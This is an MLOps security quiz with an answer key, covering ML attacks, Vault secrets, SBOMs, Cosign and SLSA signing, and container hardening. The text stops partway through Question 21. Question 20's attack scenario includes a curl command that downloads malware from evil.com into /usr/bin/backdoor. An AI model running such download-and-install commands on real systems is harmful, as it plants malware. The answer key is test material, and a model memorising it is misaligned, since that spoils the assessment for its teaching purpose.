# Module 09: MLOps Security - Quiz

## Instructions

- **Total Questions**: 30
- **Time Limit**: 45 minutes
- **Passing Score**: 75% (23/30 correct)
- **Question Types**: Multiple choice, multiple select, scenario analysis

---

## Section 1: ML Threats & OWASP ML Top 10 (Questions 1-6)

### Question 1
What is the primary goal of a model extraction attack?

A) Steal training data
B) Reverse-engineer the model by querying the API
C) Modify model predictions
D) Delete the model

<details>
<summary>Answer</summary>

**B) Reverse-engineer the model by querying the API**

**Explanation**: Model extraction (also called model theft) attacks work by:
- Querying the model API repeatedly with crafted inputs
- Recording input-output pairs
- Training a substitute model that mimics the target
- Extracting intellectual property without direct access to weights

**Real-world example**: Researchers demonstrated extracting BigML and Amazon ML models with 99% accuracy using only API queries.

**Defenses**:
- Rate limiting (e.g., 100 queries/hour per user)
- API key authentication with monitoring
- Output rounding to reduce information leakage
- Query pattern detection
- Watermarking models to detect theft

</details>

---

### Question 2
In the context of ML security, what is data poisoning?

A) Corrupting data during transmission
B) Injecting malicious samples into training data to manipulate model behavior
C) Encrypting training data
D) Deleting training data

<details>
<summary>Answer</summary>

**B) Injecting malicious samples into training data to manipulate model behavior**

**Explanation**: Data poisoning attacks:
- Inject carefully crafted malicious examples into training set
- Cause model to learn incorrect patterns
- Can be targeted (specific backdoor) or untargeted (general degradation)

**Famous example**: Microsoft Tay chatbot (2016):
- Twitter users fed it offensive content
- Bot learned and started producing inappropriate outputs
- Microsoft shut it down within 16 hours

**Types**:
1. **Label flipping**: Change labels of training examples
2. **Backdoor attacks**: Insert trigger pattern (e.g., specific pixel pattern → misclassify)
3. **Clean-label attacks**: Poison without changing labels

**Defenses**:
- Training data validation
- Anomaly detection in training set
- Data provenance tracking
- Robust training algorithms
- Regular model retraining with clean data

</details>

---

### Question 3
**[Multiple Select]** Which of the following are examples of adversarial attacks? (Select all that apply)

A) Adding imperceptible noise to an image to cause misclassification
B) Using strong passwords
C) Creating a stop sign with stickers that gets classified as a speed limit sign
D) Encrypting data at rest
E) Crafting text inputs that cause sentiment analysis to fail

<details>
<summary>Answer</summary>

**A, C, E**

**Explanation**:
- **A**: CORRECT - Classic adversarial example (FGSM, PGD attacks)
- **B**: INCORRECT - Password security, not adversarial ML
- **C**: CORRECT - Physical adversarial example (real-world attack)
- **D**: INCORRECT - Data protection, not adversarial attack
- **E**: CORRECT - Adversarial text attack

**Adversarial Examples Characteristics**:
- Imperceptible to humans
- Cause model to make confident wrong predictions
- Transferable across models
- Can exist in physical world

**Types**:
1. **White-box**: Attacker has full model access
2. **Black-box**: Attacker only has API access
3. **Physical**: Printed/manufactured adversarial objects

**Defenses**:
- Adversarial training (train on adversarial examples)
- Input validation and sanitization
- Ensemble methods
- Defensive distillation
- Certified defenses (provable robustness)

</details>

---

### Question 4
What is model inversion?

A) Running a model backward
B) Extracting training data from a trained model
C) Inverting model predictions
D) Reversing model updates

<details>
<summary>Answer</summary>

**B) Extracting training data from a trained model**

**Explanation**: Model inversion attacks:
- Exploit model to recover information about training data
- Particularly dangerous for models trained on sensitive data
- Can reconstruct faces, medical records, personal information

**How it works**:
1. Query model with many inputs
2. Analyze prediction confidence patterns
3. Reconstruct likely training examples
4. Extract sensitive information

**Example**: Researchers recovered recognizable facial images from face recognition models by analyzing model outputs.

**Risk factors**:
- Models trained on small datasets (more memorization)
- High-dimensional outputs
- Overfit models
- Models with high confidence predictions

**Defenses**:
- Differential privacy during training
- Output perturbation
- Prediction confidence limiting
- Regular model auditing for memorization

</details>

---

### Question 5
Analyze this API endpoint code:

```python
@app.post("/predict")
async def predict(input_data: Dict):
    prediction = model.predict(input_data)
    confidence = model.predict_proba(input_data)
    return {
        "prediction": prediction,
        "confidence": confidence,
        "model_version": "v1.2.3"
    }
```

What security vulnerabilities does this code have?

A) No vulnerabilities
B) No authentication, rate limiting, or input validation
C) Too much information disclosure (confidence scores, version)
D) Both B and C

<details>
<summary>Answer</summary>

**D) Both B and C**

**Explanation**: Multiple security issues:

**1. No Authentication**:
- Anyone can access the API
- No user identification or access control
- Cannot attribute queries to users

**2. No Rate Limiting**:
- Vulnerable to model extraction attacks
- Can be overwhelmed by requests (DoS)
- Cannot detect suspicious query patterns

**3. No Input Validation**:
- Accepts any input data
- Vulnerable to adversarial examples
- Could crash on malformed input

**4. Information Disclosure**:
- Confidence scores enable model extraction
- Model version reveals potential vulnerabilities
- More information = easier to attack

**Secure version**:
```python
@app.post("/predict")
async def predict(
    input_data: Dict,
    api_key: str = Security(api_key_header),
    request: Request = None
):
    # Rate limiting
    if not rate_limiter.is_allowed(api_key):
        raise HTTPException(429, "Rate limit exceeded")

    # Input validation
    if not validator.validate(input_data):
        raise HTTPException(400, "Invalid input")

    # Predict
    prediction = model.predict(input_data)

    # Return minimal information
    return {
        "prediction": prediction,
        # Don't return confidence or version
    }
```

</details>

---

### Question 6
What is the STRIDE framework used for?

A) Secret management
B) Threat modeling (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)
C) Container scanning
D) Data encryption

<details>
<summary>Answer</summary>

**B) Threat modeling (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)**

**Explanation**: STRIDE is a threat modeling framework created by Microsoft:

**S - Spoofing**: Impersonating users or systems
- Example: Attacker pretends to be authorized API user

**T - Tampering**: Unauthorized modification of data
- Example: Modifying training data or model weights

**R - Repudiation**: Denying actions taken
- Example: User denies making malicious queries

**I - Information Disclosure**: Exposing sensitive information
- Example: Model leaking training data

**D - Denial of Service**: Making system unavailable
- Example: DDoS attack on prediction API

**E - Elevation of Privilege**: Gaining unauthorized access
- Example: Exploiting vulnerability to access model weights

**How to use STRIDE for ML systems**:
1. Identify assets (model, data, API)
2. Create data flow diagrams
3. For each component, ask STRIDE questions
4. Document threats
5. Prioritize by risk
6. Implement mitigations

**Example for ML API**:
- Spoofing: Require API key authentication
- Tampering: Sign model artifacts
- Repudiation: Implement audit logging
- Info Disclosure: Rate limit to prevent extraction
- DoS: Implement request throttling
- Privilege: Run containers as non-root

</details>

---

## Section 2: Secrets Management (Questions 7-12)

### Question 7
Why should secrets never be stored in code or environment variables?

A) They're too slow
B) They can be exposed in version control, logs, and process listings
C) They take up too much memory
D) It's a legal requirement

<details>
<summary>Answer</summary>

**B) They can be exposed in version control, logs, and process listings**

**Explanation**: Storing secrets in code/environment variables is dangerous because:

**Version Control Exposure**:
- Committed to Git history (permanent, even if deleted)
- Visible to anyone with repository access
- Propagated to forks and clones
- Searchable on GitHub/GitLab

**Process Listing Exposure**:
- `ps aux` shows environment variables
- Visible to all users on same machine
- Logged in system monitoring tools

**Log Exposure**:
- Accidentally logged during debugging
- Included in error messages
- Captured in crash dumps

**Real incidents**:
- Uber: API keys in GitHub → $100K bug bounty
- Toyota: AWS credentials in public repo → data breach
- Many companies: Secrets scraped from public GitHub repos

**Secure alternatives**:
1. **HashiCorp Vault**: Centralized secrets management
2. **AWS Secrets Manager**: Cloud-based secrets
3. **Kubernetes Secrets**: Encrypted at rest
4. **Environment-specific configs**: Injected at runtime, not stored

**Best practices**:
- Use `.gitignore` for secret files
- Scan commits with tools like TruffleHog
- Rotate secrets immediately if exposed
- Use secrets managers with audit trails

</details>

---

### Question 8
What is the primary benefit of dynamic credentials in HashiCorp Vault?

A) They're faster
B) They automatically expire and don't need manual rotation
C) They're easier to remember
D) They don't require encryption

<details>
<summary>Answer</summary>

**B) They automatically expire and don't need manual rotation**

**Explanation**: Dynamic credentials are temporary credentials generated on-demand:

**How it works**:
1. Application requests credentials from Vault
2. Vault generates temporary credentials (e.g., DB username/password)
3. Credentials have short TTL (e.g., 1 hour)
4. Credentials automatically expire
5. Application can renew lease or request new credentials

**Benefits**:
- **Automatic expiration**: No manual rotation needed
- **Reduced blast radius**: Stolen credentials expire quickly
- **Audit trail**: Know exactly when/who accessed what
- **Principle of least privilege**: Grant minimal necessary access time
- **No credential sharing**: Each app/user gets unique credentials

**Example - Database credentials**:
```python
# Traditional (static)
DB_PASSWORD = "same_password_forever"  # Risk: if leaked, valid forever

# Dynamic (Vault)
db_creds = vault.create_db_credentials(role="ml-pipeline", ttl="1h")
# username: v-ml-pipeline-abc123 (unique)
# password: xyz789 (unique)
# Expires in 1 hour automatically
```

**Use cases**:
- Database access
- AWS temporary credentials
- SSH certificates
- PKI certificates

**Vault database engine example**:
```bash
vault read database/creds/ml-pipeline
# Returns: username, password with 1h TTL
```

</details>

---

### Question 9
**[Multiple Select]** Which secrets should be managed by a secrets manager like Vault? (Select all that apply)

A) Database passwords
B) API keys for third-party services
C) ML model signing keys
D) Public documentation
E) AWS access keys

<details>
<summary>Answer</summary>

**A, B, C, E**

**Explanation**:
- **A**: CORRECT - Database credentials are sensitive, should be in Vault
- **B**: CORRECT - Third-party API keys must be protected
- **C**: CORRECT - Signing keys are critical secrets
- **D**: INCORRECT - Public documentation is not a secret
- **E**: CORRECT - Cloud credentials must be secured

**Comprehensive list of secrets to manage**:

**Authentication/Authorization**:
- Database passwords
- API keys (internal and external)
- OAuth tokens
- JWT signing keys
- Service account credentials

**Infrastructure**:
- Cloud provider credentials (AWS, GCP, Azure)
- SSH private keys
- TLS/SSL certificates and private keys
- VPN credentials

**ML-Specific**:
- Model signing private keys
- MLflow tracking server credentials
- Feature store credentials
- Data warehouse credentials
- Model registry API tokens

**Encryption**:
- Encryption keys for data at rest
- Master keys for key management
- Backup encryption keys

**NOT secrets** (don't put in Vault):
- Public keys (can be in code)
- Configuration values (non-sensitive)
- Model hyperparameters
- Public URLs
- Documentation

**Storage best practices**:
- Organize by path: `secret/mlops/{service}/{secret}`
- Use versioning (KV v2 engine)
- Set up automatic rotation
- Implement lease management
- Enable audit logging

</details>

---

### Question 10
How should secrets be injected into a Kubernetes pod?

A) In the Dockerfile
B) In the deployment YAML as plain text
C) As Kubernetes Secrets mounted as volumes or environment variables
D) Hardcoded in application code

<details>
<summary>Answer</summary>

**C) As Kubernetes Secrets mounted as volumes or environment variables**

**Explanation**: Kubernetes provides native secrets management:

**Method 1: Environment Variables**
```yaml
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-credentials
      key: password
```

**Method 2: Volume Mounts** (Preferred)
```yaml
volumeMounts:
- name: secrets
  mountPath: "/etc/secrets"
  readOnly: true
volumes:
- name: secrets
  secret:
    secretName: db-credentials
```

**Why volume mounts are better**:
- Secrets not visible in `ps` output
- Automatically updated when secret changes
- Can set file permissions
- More secure than environment variables

**Best practices**:
1. **Enable encryption at rest**: Use KMS for etcd encryption
2. **RBAC**: Restrict who can read secrets
3. **External secrets**: Use Vault + External Secrets Operator
4. **Rotation**: Implement automatic secret rotation
5. **Least privilege**: Grant minimal secret access

**External Secrets Operator** (recommended for production):
```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
    kind: SecretStore
  target:
    name: db-credentials
  data:
  - secretKey: password
    remoteRef:
      key: secret/mlops/database
      property: password
```

This syncs secrets from Vault to Kubernetes, providing:
- Centralized secret management
- Automatic rotation
- Audit trail
- Dynamic credentials

**Never**:
- Put secrets in Dockerfiles
- Commit secrets to Git
- Use ConfigMaps for secrets (not encrypted)
- Hardcode in application code

</details>

---

### Question 11
What is secret rotation and why is it important?

A) Deleting old secrets
B) Periodically changing secrets to limit exposure window if compromised
C) Moving secrets between servers
D) Encrypting secrets

<details>
<summary>Answer</summary>

**B) Periodically changing secrets to limit exposure window if compromised**

**Explanation**: Secret rotation is the practice of regularly changing secrets:

**Why rotate secrets?**:
1. **Limit exposure window**: If secret leaked, old copies become invalid
2. **Compliance**: Many standards require rotation (PCI-DSS, HIPAA)
3. **Reduce blast radius**: Compromised secret has limited validity
4. **Best practice**: Assume secrets may be compromised

**Rotation strategies**:

**1. Time-based rotation** (e.g., every 90 days)
```python
if days_since_creation(secret) > 90:
    new_secret = generate_new_secret()
    update_secret(new_secret)
    notify_applications()
```

**2. Event-based rotation** (e.g., employee departure)
```python
def on_employee_departure(employee):
    secrets_accessed = get_secrets_accessed_by(employee)
    for secret in secrets_accessed:
        rotate_secret(secret)
```

**3. Automatic rotation** (dynamic credentials)
```python
# Vault dynamic credentials auto-rotate
db_creds = vault.generate_credentials(ttl="1h")
# Automatically invalidated after 1 hour
```

**Zero-downtime rotation**:
1. Generate new secret (secret v2)
2. Deploy with both old and new secrets
3. Applications start using new secret
4. After grace period, revoke old secret

**Example: Database password rotation**:
```python
def rotate_db_password():
    # 1. Generate new password
    new_password = generate_strong_password()

    # 2. Update database user
    db.execute(f"ALTER USER ml_user PASSWORD '{new_password}'")

    # 3. Update Vault
    vault.store_secret("mlops/database", {
        "password": new_password
    })

    # 4. Grace period (applications fetch new secret)
    sleep(300)  # 5 minutes

    # 5. Old password now invalid
```

**Rotation frequency**:
- High-privilege: Weekly or on-demand
- Medium-privilege: Monthly
- Low-privilege: Quarterly
- Static secrets: 90 days max
- Dynamic secrets: Hours or days

</details>

---

### Question 12
Analyze this Vault configuration:

```python
vault.store_secret("mlops/api-key", {"key": "abc123"})
vault.store_secret("mlops/db-password", {"password": "password123"})
```

What security issues exist?

A) Secrets are being stored correctly
B) Weak passwords and no rotation policy
C) Wrong storage path
D) Missing encryption

<details>
<summary>Answer</summary>

**B) Weak passwords and no rotation policy**

**Explanation**: Multiple issues:

**1. Weak password**: "password123"
- Common password
- Easily guessable
- Would fail any password policy
- Vulnerable to dictionary attacks

**2. Static API key**: "abc123"
- Short and predictable
- No indication of rotation
- Should use cryptographically random string

**3. No rotation policy**:
- No TTL specified
- No automatic rotation
- Secrets could be valid indefinitely

**4. Manual secret generation**:
- Human-generated secrets are weak
- Should use `secrets.token_urlsafe()` or similar

**Secure version**:
```python
import secrets
import string

# Generate strong API key
api_key = secrets.token_urlsafe(32)  # 256 bits
vault.store_secret("mlops/api-key", {
    "key": api_key,
    "created_at": datetime.utcnow().isoformat(),
    "rotation_period": "90d"
})

# Use dynamic database credentials instead
db_creds = vault.create_db_credentials(
    role="ml-pipeline",
    ttl="24h"  # Auto-rotates daily
)

# Or strong generated password if static needed
db_password = ''.join(
    secrets.choice(string.ascii_letters + string.digits + string.punctuation)
    for _ in range(32)
)
vault.store_secret("mlops/db-password", {
    "password": db_password,
    "created_at": datetime.utcnow().isoformat(),
    "next_rotation": (datetime.utcnow() + timedelta(days=90)).isoformat()
})
```

**Password requirements**:
- Minimum 16 characters (32+ recommended)
- Mix of uppercase, lowercase, digits, symbols
- Cryptographically random
- Never reused
- Rotated regularly

**API key requirements**:
- Minimum 32 bytes (256 bits) of entropy
- Use `secrets.token_urlsafe()` in Python
- Store with metadata (creation date, scope)
- Implement rotation

</details>

---

## Section 3: Supply Chain Security (Questions 13-18)

### Question 13
What is an SBOM (Software Bill of Materials)?

A) A shopping list
B) A complete inventory of all software components and dependencies in an application
C) A build script
D) A security policy

<details>
<summary>Answer</summary>

**B) A complete inventory of all software components and dependencies in an application**

**Explanation**: SBOM is a comprehensive list of software components:

**What it includes**:
- All libraries and dependencies
- Version numbers
- Licenses
- Suppliers/sources
- Checksums/hashes
- Dependency relationships

**Why it's important**:
1. **Vulnerability management**: Know what components have CVEs
2. **License compliance**: Track all licenses in use
3. **Supply chain security**: Verify component integrity
4. **Incident response**: Quickly identify affected systems
5. **Transparency**: Know what's in your software

**SBOM formats**:
1. **SPDX** (Software Package Data Exchange): ISO standard
2. **CycloneDX**: OWASP standard, security-focused
3. **SWID** (Software Identification): ISO/IEC standard

**Example SBOM (CycloneDX)**:
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "type": "library",
      "name": "numpy",
      "version": "1.24.0",
      "purl": "pkg:pypi/numpy@1.24.0",
      "hashes": [{"alg": "SHA-256", "content": "abc..."}],
      "licenses": [{"license": {"id": "BSD-3-Clause"}}]
    },
    {
      "type": "library",
      "name": "scikit-learn",
      "version": "1.2.0",
      "purl": "pkg:pypi/scikit-learn@1.2.0"
    }
  ]
}
```

**Generating SBOMs**:
```bash
# Python
cyclonedx-py -r -i requirements.txt -o sbom.json

# Container images
syft myimage:v1 -o cyclonedx-json > sbom.json

# Node.js
cyclonedx-npm -o sbom.json
```

**Use cases for ML**:
- Track ML framework versions (TensorFlow, PyTorch)
- Monitor for vulnerabilities in dependencies
- Ensure license compliance
- Verify model artifact integrity
- Supply chain attestation

**SBOM in MLOps pipeline**:
1. Generate SBOM during build
2. Store with model artifacts
3. Scan for vulnerabilities
4. Block deployment if critical CVEs found
5. Publish SBOM with releases

</details>

---

### Question 14
What is the purpose of signing artifacts with Cosign?

A) To compress files
B) To prove authenticity and integrity of artifacts
C) To encrypt files
D) To version files

<details>
<summary>Answer</summary>

**B) To prove authenticity and integrity of artifacts**

**Explanation**: Cosign provides cryptographic signing for container images and other artifacts:

**What signing provides**:
1. **Authenticity**: Proves artifact came from claimed source
2. **Integrity**: Detects any tampering or modification
3. **Non-repudiation**: Signer cannot deny signing
4. **Trust chain**: Links artifacts to trusted builders

**How it works**:
1. Sign artifact with private key
2. Publish signature to registry
3. Verifier uses public key to verify
4. If verification passes, artifact is authentic and unmodified

**Example - Signing container image**:
```bash
# Generate key pair (once)
cosign generate-key-pair

# Sign image
cosign sign --key cosign.key myregistry/ml-model:v1

# Signature stored in registry alongside image

# Verify image
cosign verify --key cosign.pub myregistry/ml-model:v1
```

**Example - Signing model file**:
```bash
# Sign model artifact
cosign sign-blob --key cosign.key model.pkl > model.pkl.sig

# Verify
cosign verify-blob \
  --key cosign.pub \
  --signature model.pkl.sig \
  model.pkl
```

**Keyless signing** (with OIDC):
```bash
# Sign using GitHub identity (no key management!)
cosign sign --yes myregistry/ml-model:v1

# Signature tied to GitHub identity
# Verifier can see who signed (transparency log)
```

**Why this matters for ML**:
- Prevent deployment of tampered models
- Prove model provenance
- Detect supply chain attacks
- Compliance and auditability

**In CI/CD pipeline**:
```yaml
- name: Sign model artifact
  run: cosign sign-blob --yes model.pkl > model.pkl.sig

- name: Verify before deployment
  run: |
    cosign verify-blob \
      --key cosign.pub \
      --signature model.pkl.sig \
      model.pkl || exit 1
```

**Attack scenario prevented**:
- Attacker compromises artifact storage
- Modifies model weights to introduce backdoor
- Without signature: Backdoored model deployed
- With signature: Verification fails, deployment blocked

</details>

---

### Question 15
What is SLSA (Supply-chain Levels for Software Artifacts)?

A) A programming language
B) A framework for ensuring software supply chain integrity with 4 levels of increasing security
C) A container runtime
D) A testing framework

<details>
<summary>Answer</summary>

**B) A framework for ensuring software supply chain integrity with 4 levels of increasing security**

**Explanation**: SLSA (pronounced "salsa") is a security framework from Google:

**SLSA Levels**:

**Level 0**: No guarantees
- Documentation only
- No automated verification

**Level 1**: Provenance exists
- Build process is automated
- Provenance is generated describing how artifact was built
- Basic attribution

**Level 2**: Provenance signed
- Provenance signed by build service
- Tamper-resistant provenance
- Source integrity verified

**Level 3**: Hardened build platform
- Build runs on hardened platform
- Strong access controls
- Provenance prevents tampering

**Level 4**: Hermetic builds
- Fully reproducible builds
- Two-party review of changes
- Complete supply chain security

**SLSA Provenance** example:
```json
{
  "builder": {
    "id": "https://github.com/actions/runner"
  },
  "buildType": "https://github.com/actions/workflow",
  "invocation": {
    "configSource": {
      "uri": "git+https://github.com/myorg/ml-model",
      "digest": {"sha1": "abc123..."}
    }
  },
  "materials": [
    {
      "uri": "git+https://github.com/myorg/ml-model",
      "digest": {"sha256": "def456..."}
    },
    {
      "uri": "s3://data/training.csv",
      "digest": {"sha256": "xyz789..."}
    }
  ],
  "metadata": {
    "buildFinishedOn": "2024-01-15T10:30:00Z"
  }
}
```

**Benefits for MLOps**:
- Prove model trained from specific code/data versions
- Detect unauthorized modifications
- Reproducible model builds
- Audit trail for compliance

**Implementation in GitHub Actions**:
```yaml
- name: Generate SLSA provenance
  uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.5.0
  with:
    artifact-path: model.pkl
```

**Verification**:
```bash
slsa-verifier verify-artifact model.pkl \
  --provenance-path provenance.json \
  --source-uri github.com/myorg/ml-model
```

**Attack scenario prevented**:
- Attacker compromises CI/CD
- Injects malicious code during build
- Without SLSA: Attack succeeds undetected
- With SLSA: Provenance shows unexpected changes, verification fails

</details>

---

### Question 16
**[Multiple Select]** Which information should be included in an SBOM for an ML model? (Select all that apply)

A) All Python dependencies with versions
B) ML framework versions (TensorFlow, PyTorch, etc.)
C) Training data location and checksum
D) Model architecture details
E) Developer passwords

<details>
<summary>Answer</summary>

**A, B, C**

**Explanation**:
- **A**: CORRECT - All dependencies must be tracked for vulnerability scanning
- **B**: CORRECT - ML frameworks are critical dependencies
- **C**: CORRECT - Training data is a "material" in the build process
- **D**: Debatable - Architecture could be included as metadata but not typically in SBOM
- **E**: INCORRECT - Never include secrets in SBOM

**Comprehensive ML SBOM contents**:

**Software components**:
```json
{
  "components": [
    {
      "type": "library",
      "name": "tensorflow",
      "version": "2.12.0",
      "licenses": [{"license": {"id": "Apache-2.0"}}]
    },
    {
      "type": "library",
      "name": "numpy",
      "version": "1.24.0"
    }
  ]
}
```

**ML-specific additions**:
```json
{
  "components": [
    {
      "type": "model",
      "name": "fraud-detection-model",
      "version": "1.0.0",
      "hashes": [{"alg": "SHA-256", "content": "abc..."}]
    }
  ],
  "metadata": {
    "properties": [
      {"name": "training_data", "value": "s3://data/train.csv"},
      {"name": "training_data_hash", "value": "sha256:xyz..."},
      {"name": "framework", "value": "tensorflow:2.12.0"},
      {"name": "python_version", "value": "3.9.16"}
    ]
  }
}
```

**What NOT to include**:
- Secrets or credentials
- Proprietary algorithms (unless documented)
- Personal information
- Internal network topology

**Best practices**:
1. Generate SBOM automatically in CI/CD
2. Store with model artifacts
3. Update on every model version
4. Scan for vulnerabilities
5. Archive for audit trail

**Tools**:
- `cyclonedx-py` for Python projects
- `syft` for container images
- `trivy` can generate SBOMs
- `grype` for vulnerability scanning

</details>

---

### Question 17
How can you verify that a container image hasn't been tampered with?

A) Check the file size
B) Verify the cryptographic signature using a public key
C) Look at the creation date
D) Check if it runs

<details>
<summary>Answer</summary>

**B) Verify the cryptographic signature using a public key**

**Explanation**: Cryptographic signatures provide the only reliable verification:

**Why other options don't work**:
- **File size**: Can be manipulated to match original
- **Creation date**: Metadata can be forged
- **Runs successfully**: Malicious code can run fine

**Verification process**:
1. Image is signed with private key during build
2. Signature stored in registry (OCI manifest)
3. Before deployment, verify signature with public key
4. If signature valid, image is authentic and unmodified

**Using Cosign**:
```bash
# Sign during build
cosign sign --key cosign.key myregistry/ml-model:v1

# Verify before deployment
cosign verify --key cosign.pub myregistry/ml-model:v1
```

**Verification output**:
```json
{
  "critical": {
    "identity": {
      "docker-reference": "myregistry/ml-model"
    },
    "image": {
      "docker-manifest-digest": "sha256:abc123..."
    }
  },
  "optional": {
    "Subject": "user@example.com"
  }
}
```

**In Kubernetes admission controller**:
```yaml
# Admission policy enforcing signed images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-signatures
spec:
  validationFailureAction: enforce
  rules:
  - name: verify-cosign-signature
    match:
      resources:
        kinds:
        - Pod
    verifyImages:
    - imageReferences:
      - "myregistry/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              ...
              -----END PUBLIC KEY-----
```

**What signature verification proves**:
1. **Authenticity**: Image from trusted source
2. **Integrity**: Not modified since signing
3. **Accountability**: Know who signed it (with keyless signing)

**Attack scenarios prevented**:
- Registry compromise (attacker replaces image)
- Man-in-the-middle (image modified in transit)
- Compromised artifact storage
- Supply chain injection

**Additional verification**:
- Check image digest (SHA-256 hash)
- Verify against SBOM
- Check vulnerability scan results
- Validate SLSA provenance

</details>

---

### Question 18
What is the main purpose of vulnerability scanning in a CI/CD pipeline?

A) To make builds slower
B) To detect known security vulnerabilities in dependencies before deployment
C) To compress images
D) To generate documentation

<details>
<summary>Answer</summary>

**B) To detect known security vulnerabilities in dependencies before deployment**

**Explanation**: Vulnerability scanning identifies known security issues:

**What scanners do**:
1. Analyze dependencies and container layers
2. Compare against CVE databases
3. Report vulnerabilities by severity
4. Suggest remediation (upgrade version)

**When to scan**:
- **Build time**: Scan during CI/CD before deployment
- **Registry**: Continuous scanning of stored images
- **Runtime**: Scan running containers periodically

**Example with Trivy**:
```bash
# Scan container image
trivy image --severity HIGH,CRITICAL myregistry/ml-model:v1

# Output:
# myregistry/ml-model:v1 (alpine 3.15)
# =====================================
# Total: 2 (HIGH: 1, CRITICAL: 1)
#
# CVE-2022-1234 (CRITICAL)
# Package: libssl
# Installed Version: 1.1.1k
# Fixed Version: 1.1.1n
# Description: Buffer overflow in SSL...
```

**CI/CD integration**:
```yaml
- name: Scan container image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: ${{ env.IMAGE }}
    exit-code: '1'  # Fail build on vulnerabilities
    severity: 'CRITICAL,HIGH'
    ignore-unfixed: true
```

**Scanning tools**:
1. **Trivy**: Fast, comprehensive, free
2. **Grype**: Fast, accurate
3. **Snyk**: Commercial, good UX
4. **Clair**: Open source, used by Quay
5. **Anchore**: Policy-based scanning

**Scan results handling**:

**Critical vulnerabilities**:
- Block deployment
- Create urgent ticket
- Notify security team

**High vulnerabilities**:
- Block deployment (or warn)
- Require approval to proceed
- Set remediation deadline

**Medium/Low vulnerabilities**:
- Log for tracking
- Address in next release
- Monitor for exploit activity

**False positive handling**:
```yaml
# .trivyignore
CVE-2022-1234  # False positive, not exploitable in our use case
CVE-2022-5678  # No fix available, accepted risk
```

**Best practices**:
1. Scan early and often
2. Fail builds on critical/high vulnerabilities
3. Keep scanner databases updated
4. Document exceptions with justifications
5. Scan both dependencies and base images
6. Integrate with vulnerability management system

**Example policy**:
- CRITICAL: Auto-block, must fix within 24h
- HIGH: Block deployment, fix within 7 days
- MEDIUM: Warn, fix within 30 days
- LOW: Track, address opportunistically

</details>

---

## Section 4: Container Security (Questions 19-24)

### Question 19
Why should containers NOT run as root?

A) It's slower
B) If the container is compromised, the attacker has root access to the host
C) It uses more memory
D) It's harder to debug

<details>
<summary>Answer</summary>

**B) If the container is compromised, the attacker has root access to the host**

**Explanation**: Running as root violates the principle of least privilege:

**Security risks of running as root**:
1. **Container escape**: If attacker escapes container, has root on host
2. **Privilege escalation**: Can modify system files
3. **Broader attack surface**: Can access all resources
4. **Lateral movement**: Can attack other containers

**Real-world example**: CVE-2019-5736 (runC vulnerability)
- Allowed container escape
- Containers running as root could gain root on host
- Containers running as non-root had limited impact

**How to run as non-root**:

**Dockerfile**:
```dockerfile
# Create non-root user
RUN useradd -m -u 1000 mluser

# Set ownership
COPY --chown=mluser:mluser app/ /app/

# Switch to non-root user
USER mluser

# Now container processes run as mluser, not root
```

**Kubernetes**:
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  fsGroup: 1000
```

**Verification**:
```bash
# Check what user container runs as
kubectl exec pod-name -- whoami
# Should output: mluser (not root)
```

**Common issues when switching to non-root**:

**Permission errors**:
```dockerfile
# Fix: Set ownership correctly
COPY --chown=mluser:mluser app/ /app/
RUN chown -R mluser:mluser /app
```

**Port binding**:
```dockerfile
# Can't bind to ports < 1024 as non-root
# Use port 8000 instead of 80
EXPOSE 8000
```

**File writes**:
```yaml
# Need writable volume
volumeMounts:
- name: tmp
  mountPath: /tmp
volumes:
- name: tmp
  emptyDir: {}
```

**Benefits**:
- Reduced blast radius if compromised
- Defense in depth
- Compliance (PCI-DSS, HIPAA require it)
- Best practice alignment

</details>

---

### Question 20
What does `readOnlyRootFilesystem: true` in a Kubernetes security context do?

A) Makes the container faster
B) Prevents writes to the container filesystem, reducing attack surface
C) Compresses the filesystem
D) Makes the container read-only on disk

<details>
<summary>Answer</summary>

**B) Prevents writes to the container filesystem, reducing attack surface**

**Explanation**: Read-only root filesystem prevents filesystem modifications:

**Security benefits**:
1. **Prevents malware installation**: Can't write malicious binaries
2. **Stops log tampering**: Attackers can't cover their tracks
3. **Blocks persistence**: Can't modify startup scripts
4. **Immutable infrastructure**: Container matches image exactly

**How it works**:
```yaml
securityContext:
  readOnlyRootFilesystem: true
```

Filesystem mounted read-only, any write attempt fails:
```bash
# Inside container
echo "test" > /tmp/file
# Error: Read-only file system
```

**But applications need to write!**

**Solution: Mount specific writable volumes**:
```yaml
containers:
- name: ml-model
  securityContext:
    readOnlyRootFilesystem: true
  volumeMounts:
  - name: tmp
    mountPath: /tmp  # Writable
  - name: cache
    mountPath: /app/.cache  # Writable
  - name: logs
    mountPath: /var/log  # Writable

volumes:
- name: tmp
  emptyDir: {}
- name: cache
  emptyDir: {}
- name: logs
  emptyDir: {}
```

**Application updates**:
```python
# Don't write to /app/data.json (read-only)
# Write to /tmp/data.json instead
import tempfile

# Use temp directory (mounted as writable)
with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
    json.dump(data, f)
```

**Common writable paths needed**:
- `/tmp` - Temporary files
- `/var/log` - Application logs
- `/app/.cache` - Model/data caches
- `/run` - Runtime data

**Testing**:
```bash
# Verify read-only
kubectl exec pod-name -- touch /test.txt
# Should fail with "Read-only file system"

# Verify writable volumes work
kubectl exec pod-name -- touch /tmp/test.txt
# Should succeed
```

**Attack scenario prevented**:
1. Attacker exploits application vulnerability
2. Tries to download malware: `curl http://evil.com/malware -o /usr/bin/backdoor`
3. Without read-only: Malware installed and executed
4. With read-only: Write fails, attack prevented

**Best practices**:
- Enable for all containers by default
- Only mount necessary paths as writable
- Use `emptyDir` volumes (not `hostPath`)
- Consider `emptyDir.sizeLimit` to prevent disk exhaustion

</details>

---

### Question 21
**[Multiple Select]** Which Linux capabilities should typically be dropped from ML containers? (Select all that apply)

A) NET_ADMIN (network administration)
